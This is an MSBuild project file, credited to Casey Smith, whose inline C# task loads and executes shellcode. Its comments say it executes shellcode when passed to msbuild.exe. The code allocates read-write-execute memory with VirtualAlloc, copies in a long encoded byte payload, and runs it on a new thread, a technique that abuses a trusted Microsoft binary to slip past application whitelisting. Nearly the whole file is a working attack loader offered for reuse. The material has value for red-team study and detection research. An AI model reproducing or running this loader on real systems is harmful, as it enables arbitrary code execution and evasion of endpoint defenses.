<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
		{         
		  private static UInt32 MEM_COMMIT = 0x1000;          
		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
		  [DllImport("kernel32")]
		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
		  [DllImport("kernel32")]
		    private static extern IntPtr CreateThread(            
		    UInt32 lpThreadAttributes,
		    UInt32 dwStackSize,
		    UInt32 lpStartAddress,
		    IntPtr param,
		    UInt32 dwCreationFlags,
		    ref UInt32 lpThreadId           
		    );
		  [DllImport("kernel32")]
		    private static extern UInt32 WaitForSingleObject(           
		    IntPtr hHandle,
		    UInt32 dwMilliseconds
		    );          
		  public override bool Execute()
		  {
			//replace with your own shellcode
		    byte[] shellcode = new byte[] { 0xb8,0xc6,0x3f,0x0b,0xe9,0xdd,0xc5,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0xf2,0x83,0xc2,0x04,0x31,0x42,0x0e,0x03,0x84,0x31,0xe9,0x1c,0xd2,0x9a,0x55,0xf2,0x19,0xeb,0xa9,0xd2,0xa9,0xc8,0x41,0xbf,0x60,0xd8,0x1b,0xab,0xb3,0x99,0x43,0x2f,0xf0,0x05,0xf7,0xc4,0x26,0x2c,0xcb,0xc8,0x2d,0x2e,0xe1,0x38,0xf4,0xcb,0xf1,0x91,0x4b,0x5a,0xa5,0xa5,0xc7,0x55,0xdd,0x31,0xd9,0x54,0x18,0x85,0xdf,0xde,0x14,0x5b,0x92,0x64,0x61,0x52,0xab,0x29,0x92,0xaf,0xe2,0x4f,0xa1,0xff,0xc2,0x3d,0xe9,0x50,0xd0,0x7e,0x4e,0x84,0x26,0x57,0x27,0x66,0xb7,0x65,0x89,0xbd,0x87,0x59,0x87,0x39,0xbf,0xd4,0xbf,0xb6,0x45,0xa0,0x30,0xdb,0xc6,0x2f,0x9e,0xaf,0x92,0x93,0x06,0xef,0x88,0x02,0xe1,0xf1,0x81,0x45,0x0e,0x40,0xc8,0x88,0x37,0xf0,0x61,0xde,0xad,0xf5,0x71,0x58,0x6e,0x89,0xe1,0xd1,0xe2,0x09,0x4f,0x46,0x74,0x90,0x6e,0x4a,0x39,0x4b,0x58,0xe3,0x2f,0x72,0x1b,0x0c,0xb4,0xba,0x1b,0x4d,0xd8,0x18,0xfc,0x37,0x55,0xa3,0x25,0x3c,0x15,0xce,0x7b,0x4a,0x78,0xe7,0x28,0x03,0x0d,0x3f,0xb5,0xd4,0x62,0xd2,0xb9,0x2d,0x41,0xad,0xf9,0xfc,0xdd,0x9b,0xd7,0xd5,0xfa,0x63,0x8b,0x58,0xa1,0x2c,0xb7,0xff,0x08,0x41,0x35,0x72,0x84,0x3b,0x4b,0xd4,0x91,0xda,0x7b,0x24,0x56,0xef,0x34,0x65,0xbe,0x5b,0x2d,0x15,0x2c,0xf0,0xbf,0x36,0x5e,0xa3,0x5c,0x3c,0xb6,0x52,0xf8,0xd6,0xda,0xf0,0x46,0xc8,0x42,0xe4,0x52,0xcc,0xb7,0x22,0x13,0x29,0x2f,0x92,0x8b,0x9b,0x25,0xb7,0xa5,0xc9,0x92,0x96,0x91,0x54,0x02,0xb7,0xaa,0xff,0xa0,0x58,0xb6,0xe7,0x88,0xca,0x15,0x7f,0x6e,0x1f,0xfc,0x05,0x81,0xe8,0x2b,0xa3,0x3c,0x8c,0xc6,0x38,0x06,0x02,0xd7,0x72,0x55,0x71,0xea,0x5a,0x57,0x18,0xfe,0xfb,0x1e,0x73,0xe6,0x00,0xce,0x0a,0x76,0x20,0x5e,0x7f,0xc2,0xdc,0x79,0x46,0x0b,0xc7,0xff,0xd6,0xa2,0xa0,0xb1,0xbf,0xef,0xe7,0xa9,0xf0,0xe9,0xfd,0x57,0x9b,0x07,0x3f,0x58,0x3d,0xcf,0x77,0x9d,0xb6,0x89,0xea,0xe5,0x23,0x1c,0x33,0x13,0x4f,0x8a,0x5b,0xab,0xc7,0xab,0xd8,0xad,0x1b,0x27,0x69,0x38,0xb8,0xfc,0x70,0xe0,0x77,0x28,0xd8,0x77,0x9e,0x0d,0xa5,0xac,0xa6,0xbe,0x2e,0x46,0x54,0x1f,0xf4,0xd5,0xd8,0x9a,0x82,0xe7,0xf2,0x97,0xb1,0x44,0x44,0xd9,0xe2,0xee,0x6f,0x7e,0xf8,0xbb,0x1c,0x66,0xc4,0x90,0xb6,0x8b,0x90,0xb1,0x15,0x78,0x0d,0x21,0x25,0x19,0x0b,0xf5,0x1f,0x40,0x25,0x57,0x37,0x61,0x25,0xf8,0xae,0x56,0xcc,0x6e,0xf8,0x6f,0x57,0xd8,0x69,0x90,0xce,0x03,0x78,0x8a,0xfb,0xfe,0x1a,0x7e,0x02,0xe9,0xcf,0x9f,0x09,0xd7,0x21,0x3f,0xb8,0x3d,0x59,0x6f,0x3b,0x4a,0x6e,0xa4,0x0a,0xca,0xa2,0xe6,0x29,0xea,0xd3,0x9e,0xfe,0x37,0x7d,0xb4,0x77,0x9e,0x85,0x2e,0x02,0xfc,0x98,0x25,0x45,0xfb,0x2e,0x44,0xf1,0xf8,0x81,0xd2,0x1a,0xe6,0xaa,0x6a,0x1f,0x84,0xc3,0x05,0x31,0xd8,0xde,0x33,0x6c,0xde,0xd9,0x5d,0xb4,0x34,0x67,0x6f,0x7e,0x2e,0xc7,0xd7,0x03,0xac,0xb1,0xe4,0x53,0x40,0x9c,0x35,0xf8,0x32,0x92,0x27,0xac,0x8b,0x68,0xf3,0x12,0xb7,0xd0,0x31,0xdf,0x58,0x19,0x71,0xc9,0x3c,0xb1,0x84,0xfd,0x61,0x36,0xd5,0x36,0xe1,0x9a,0x82,0x9c,0xd9,0xfc,0x2e,0xf5,0xab,0xb0,0x2d,0x81,0x32,0x62,0xd1,0x72,0x35,0x4e,0xd0,0xb2,0x57,0x8c,0x59,0x6c,0x61,0x0a,0xe1,0x06,0x06,0xe5,0x9a,0x00,0x30,0xcc,0x7d,0xf6,0xe5,0x2f,0x3c,0xa5,0x3b,0x91,0x9c,0xaf,0xc7,0xb8,0x5e,0x47,0x5e,0x3f,0x81,0xe1,0x95,0xc4,0x04,0x44,0x50,0xa8,0x8d,0x10,0xf8,0x20,0x8c,0xc0,0xed,0xa1,0xda,0x95,0xed,0x41,0xdf,0xbf,0xf6,0x44,0x6d,0xc4,0xfd,0x92,0xaf,0x74,0x73,0xc0,0x91,0xeb,0x65,0x87,0xbd,0xbe,0xcd,0x88,0xd6,0xeb,0x40,0x2a,0xf8,0x20,0x15,0x0f,0x12,0x28,0x48,0x5b,0x75,0xe3,0xb9,0x0d,0xe4,0x3f,0x6b,0xa4,0xab,0xaf,0x70,0xca,0x36,0x93,0x25,0xe1,0x5c,0x89,0x6d,0xc7,0x35,0x3f,0x58,0x41,0x09,0x82,0x40,0x3a,0x45,0xe0,0x93,0x09,0x0d,0xe7,0x61,0x40,0x7d,0x7f,0x67,0x61,0xd4,0xc4,0xc6,0xa6,0x45,0x91,0x7e,0x66,0x16,0xe9,0x22,0xbc,0x5f,0x6c,0x3e,0x48,0x61,0x39,0xf1,0x2e,0x6e,0x37,0x76,0xbf,0xb0,0x64,0x90,0xda,0x96,0x5f,0x85,0x63,0xa8,0x53,0x80,0xa6,0x00,0x0b,0x4e,0xaa,0x45,0x9e,0x96,0xe7,0x64,0xa8,0xfc,0x19,0x91,0x94,0x96,0x58,0xeb,0xa5,0x1d,0x1e,0x3e,0x6b,0xf8,0x69,0xc1,0x9b,0x5f,0x81,0xb7,0x5c,0x88,0xa8,0x30,0xa8,0xde,0x65,0x1e,0x4a,0xc9,0xa3,0x2f,0x15,0x69,0x81,0x1b,0xaa,0x77,0xee,0x90,0xcc,0x17,0x69,0x6e,0x5f,0xf1,0x79,0x83,0xff,0x91,0x02,0xd3,0xec,0x88,0xcf,0xce,0xba,0x10,0x6e,0x18,0xee,0x89,0x65,0x18,0x3c,0x33,0xcb,0xbd,0x36,0xe5,0xbd,0x90,0xf8,0x3d,0x7b,0x0c,0xad,0x00,0x22,0x60,0xa4,0x75,0x4f,0xcd,0x3f,0xd3,0x7a,0x56,0x7f,0xe3,0x92,0x90,0xfb,0x26,0xb5,0x98,0xe7,0xe9,0x66,0x06,0xfd,0x5a,0x81,0x8b,0x00,0x98,0x6a,0xb0,0x18,0x50,0xaf,0x84,0xff,0x0d,0x32,0x84,0x0b,0x4d,0x59,0x6f,0x9b,0xc4,0xef,0x83,0x2e,0x08,0x00,0x57,0x98,0x0a,0x8a,0xb7,0x01,0xf5,0x76,0xa7,0x2d,0x3e,0x72,0x10,0x9a,0xcb,0xba,0x99,0xab,0x5a,0xe5,0xf3,0x73,0x50,0x42,0x9c,0xcf,0x6e,0x52,0x2a,0xe2,0xfa,0xd0,0x07,0x80,0x6e,0x8b,0x82,0xfd,0xa6,0xf0,0x06,0x3c,0x9b,0xc6,0x0f,0x35,0x33,0x48,0xd3,0xc2,0x0a,0xa7,0x32,0x83,0xe1,0x40,0xc9,0x87,0x62,0xb2,0xe1,0xdb,0x34,0xa8,0x5e,0x20,0xe6,0x7f,0x5e,0xa8,0x54,0xa1,0x4a,0xfd,0x97,0xbd,0x5d,0xbe,0x5e,0x00,0xb1,0xc0,0x7a,0x70,0x60,0x8e,0x4a,0x65,0x92,0x4d,0xda,0xbb,0xac,0x38,0xfc,0x5c,0x8a,0xcd,0xf6,0xe2,0x5e,0x6c,0x40,0x95,0xb0,0xa0,0x94,0xbe,0x5b,0x53,0x64,0x87,0x55,0xa6,0xdf,0xdc,0xf4,0x67,0x83,0x6e,0xe9,0x1a,0x53,0x07,0xd1,0x32,0x97,0xc7,0xaa,0x59,0xad,0xa2,0x20,0xe3,0xa5,0x49,0x4d,0x3a,0xbd,0x07 };			
			UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
		      IntPtr hThread = IntPtr.Zero;
		      UInt32 threadId = 0;
		      IntPtr pinfo = IntPtr.Zero;
		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		      return true;
		  } 
		}     
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>